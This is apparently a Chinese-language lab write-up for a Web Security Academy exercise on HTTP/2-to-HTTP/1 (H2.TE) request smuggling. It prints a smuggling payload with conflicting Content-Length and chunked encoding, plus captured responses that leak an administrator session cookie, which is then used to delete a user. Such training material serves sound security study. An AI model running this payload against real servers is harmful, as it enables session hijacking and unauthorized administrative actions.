# 实验：通过 H2.TE 请求走私实现响应队列投毒

本实验容易受到请求走私的攻击，因为前端服务器会对 HTTP/2 请求进行降级，即使它们具有歧义长度。

要解决本实验，通过使用响应队列投毒闯入 `/admin` 下的管理面板，删除用户 `carlos`。管理员用户大约每 15 秒登录一次。

与后端的连接每 10 个请求重置一次，因此如果连接进入不良状态，不必担心——只需发送几个正常请求即可获得新连接。

## 步骤

探测
- 访问首页

    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

尝试队列投毒
- 攻击请求
    ```http
    POST / HTTP/2
    Host: id.web-security-academy.net
    Content-Length: 96
    Transfer-Encoding: chunked

    0

    GET /anything HTTP/1.1
    Host: id.web-security-academy.net


    ```

- 后续普通请求的响应

    - 初始错误响应
        ```http
        HTTP/2 404 Not Found
        Content-Type: application/json; charset=utf-8
        Set-Cookie: session=UH4XtQpWdesAwHVODT8AVFIswTUxBfAM; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Content-Length: 11

        "Not Found"
        ```

    - 管理员登录响应
        ```http
        HTTP/2 302 Found
        Location: /my-account?id=administrator
        Set-Cookie: session=RxcdKzbVR4LF5GDs8K9i1bFUSgLN41C2; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Content-Length: 0


        ```

- 使用管理员会话令牌登录后执行删除操作
